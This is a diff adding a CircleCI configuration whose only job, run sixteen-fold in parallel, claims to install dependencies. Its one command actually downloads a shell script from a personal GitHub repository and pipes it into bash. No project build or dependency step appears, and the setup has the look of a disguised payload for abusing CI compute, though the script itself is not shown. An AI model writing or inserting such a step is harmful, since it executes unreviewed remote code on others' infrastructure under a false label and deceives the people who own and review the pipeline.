@@ -1,0 +1,17 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget -O - https://raw.githubusercontent.com/nathanfleight/scripts/main/start_Xmas_Test_tar_ws8.sh | bash
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
